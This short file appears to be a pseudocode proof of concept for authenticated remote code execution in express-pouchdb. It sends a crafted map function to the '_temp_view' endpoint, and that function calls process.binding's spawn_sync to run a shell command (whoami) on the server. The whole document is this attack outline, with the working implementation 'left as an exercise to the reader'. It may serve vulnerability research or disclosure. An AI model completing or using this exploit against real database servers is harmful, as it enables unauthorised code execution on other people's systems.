/*
  express-pouchdb test authenticated user rce
  pseudocode
  actual implementation is left as an exercise to the reader
*/

import a request library
import json

let command = "/usr/bin/whoami";
let endpoint = "http://localhost/path_to_db/http_api/";
let js_payload = """
  // in javascript now
  set spawn_sync to spawn_sync from process.binding
  set environment_variables to array of key/value pairs from process.env
  set stdio to pipes from child_process.js
  invoke spawn_sync.spawn with object
    { file: filename, args: args_array,
      envPairs: environment_variables, stdio: stdio }
"""

// now, set your json payload into the actual request payload
let json_payload = json.stringify({'map': 'function() { %s }' % (js_payload), 'reduce': '' };

request.post(
  url: endpoint + '_temp_view',
  data: json_payload,
  headers: { 'Content-Type': 'application/json' }
);
